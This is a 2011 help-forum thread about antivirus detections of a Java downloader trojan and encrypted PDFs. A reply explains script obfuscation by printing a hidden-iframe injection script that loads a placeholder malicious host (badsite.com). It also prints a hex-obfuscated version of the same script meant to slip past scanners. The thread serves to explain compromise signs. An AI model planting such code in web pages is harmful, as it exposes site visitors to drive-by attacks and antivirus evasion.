---
title: "Java Trojan"
date: 2011-11-11
forum: General Help
---

### Post by motorcity909 on 2011-11-11
[FONT=Verdana][SIZE=2]Hi [/SIZE][/FONT][FONT=Verdana][SIZE=2]all

[/SIZE][/FONT][FONT=Verdana][SIZE=2]I ran a Clam virus scan earlier this week and it found 11 problems.[/SIZE][/FONT]
[FONT=Verdana][SIZE=2]9 of them were PDFs &#8211; it said &#8220;Heuristics.Encrypted.PDF&#8221;[/SIZE][/FONT]

[FONT=Verdana][SIZE=2]4 of the PDFs were self-created from my scanner and have been on my computer since early 2010, so have been through many earlier scans and nothings been found before.[/SIZE][/FONT]

[FONT=Verdana][SIZE=2]The other 5 PDFs are things like manuals that I've either downloaded or got off a CD.  They too have been on my computer since 2009/10 so again have been checked under earlier scans.[/SIZE][/FONT]

[FONT=Verdana][SIZE=2]Clam updated yesterday and another scan showed 4 of the PDFs as all clear, although it was still showing the self-created scans plus a PSP manual as a problem.[/SIZE][/FONT]

[FONT=Verdana][SIZE=2]I've also checked those PDFs on a Windows machine using AVG and Malware Bytes and the PDFs were all clear so I'm not too worried about them.[/SIZE][/FONT]

[FONT=Verdana][SIZE=2]I am a bit more worried about the two **Trojan.Java.Downloader-1** that Clam has found in the .java/deployment/cache/6.0 folder.[/SIZE][/FONT]
[FONT=Verdana][SIZE=2]
Scanning those files on the Windows machine with AVG, Malware Bytes and Trend Micro online agreed with Clam.[/SIZE][/FONT]
[FONT=Verdana][SIZE=2]So, should I be worried?  If I quarantine/delete those files will Java still work okay?[/SIZE][/FONT]
[FONT=Verdana][SIZE=2]
Thanks as always[/SIZE][/FONT]
[FONT=Verdana][SIZE=2]Dave
[/SIZE][/FONT]

---

### Post by Dangertux on 2011-11-11
Many anti-malware solutions will pick up packed java code as being malicious. They may or may not be malicious in nature, however packing is a technique commonly used by attackers to obfuscate the intentions of malicious code.

Removing it won't stop java from working, and on the same coin if you can vouch for the validity of the PDF (IE : You created it yourself) the chances of it being malicious are not high.

EDIT : After reading your post more thoroughly I see that there are two different issues. In any case removing files from your java cache should also not stop java from working.

---

### Post by SparTacux on 2011-11-11
What do you mean by packing Dangertux? Any chance you can expand on this.

---

### Post by torsionbar on 2011-11-11
> **SparTacux said:**
> What do you mean by **packing** Dangertux? Any chance you can **expand** on this.
That's funny!  Pun intended?

---

### Post by Dangertux on 2011-11-11
Javascript packing or javascript obfuscation is commonly used by attackers on compromised sites and file format exploit attack vectors to attempt to deceive humans and automated scanners, particularly AV browser plugins. They do this by altering how the code appears , and making it appear less...Malicious...

Below is a common iframe based vector you might find on a compromised wordpress site

```

function MakeFrameEx(){
  element = document.getElementById('yahoo_api');
  if (!element){
    var el = document.createElement('iframe');
    document.body.appendChild(el);
    el.id = 'yahoo_api';
    el.style.width = '1px';
    el.style.height = '1px';
    el.style.display = 'none';
    el.src = 'http://badsite.com/index.php?n=131251235''
  }
}
var ua = navigator.userAgent.toLowerCase();
if (((ua.indexOf("msie") !=- 1 && ua.indexOf("opera") ==- 1 && ua.indexOf("webtv") ==- 1))
 && ua.indexOf("windows") !=- 1){
  var t = setTimeout("MakeFrameEx()", 1000)
}

```An example of the same script obfuscated with a simple packing method would be this

```

var _0x6181=["\x79\x61\x68\x6F\x6F\x5F\x61\x70\x69","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x69\x64","\x77\x69\x64\x74\x68","\x73\x74\x79\x6C\x65","\x31\x70\x78","\x68\x65\x69\x67\x68\x74","\x64\x69\x73\x70\x6C\x61\x79","\x6E\x6F\x6E\x65","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x62\x61\x64\x73\x69\x74\x65\x2E\x63\x6F\x6D\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x3F\x6E\x3D\x31\x32\x33\x31\x32\x33\x31\x32\x33\x35","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x6D\x73\x69\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x6F\x70\x65\x72\x61","\x77\x65\x62\x74\x76","\x77\x69\x6E\x64\x6F\x77\x73","\x4D\x61\x6B\x65\x46\x72\x61\x6D\x65\x45\x78\x28\x29"];function MakeFrameEx(){element=document[_0x6181[1]](_0x6181[0]);if(!element){var _0x4878x2=document[_0x6181[3]](_0x6181[2]);document[_0x6181[5]][_0x6181[4]](_0x4878x2);_0x4878x2[_0x6181[6]]=_0x6181[0];_0x4878x2[_0x6181[8]][_0x6181[7]]=_0x6181[9];_0x4878x2[_0x6181[8]][_0x6181[10]]=_0x6181[9];_0x4878x2[_0x6181[8]][_0x6181[11]]=_0x6181[12];_0x4878x2[_0x6181[13]]=_0x6181[14];} ;} ;var ua=navigator[_0x6181[16]][_0x6181[15]]();if(((ua[_0x6181[18]](_0x6181[17])!=-1&&ua[_0x6181[18]](_0x6181[19])==-1&&ua[_0x6181[18]](_0x6181[20])==-1))&&ua[_0x6181[18]](_0x6181[21])!=-1){var t=setTimeout(_0x6181[22],1000);} ;

```They both do the exact same thing with the same intentions, however one is clearly more difficult for a scanner to pick up. Obviously if you see something like this on your "About me" page and you didn't put there it might be time to start thinking about your site having been compromised.

Hope this helps.

P.S: That was funny I hope the pun was intended lol.

---

### Post by SparTacux on 2011-11-11
That's Interesting.
I take it there is some special software tool to do the packing then?

PS . You've got to watch me close Dangertux - I'm a master of the subliminal ;-)

---

### Post by Dangertux on 2011-11-11
> **SparTacux said:**
> That's Interesting.
I take it there is some special software tool to do the packing then?

PS . You've got to watch me close Dangertux - I'm a master of the subliminal ;-)

Well... There are tools to obfuscate the code, but obviously that establishes a pattern, so the more you do yourself the less likely AV will catch you, and that descends into a discussion this forum doesn't really support. So we'll just end it there ;-)

---

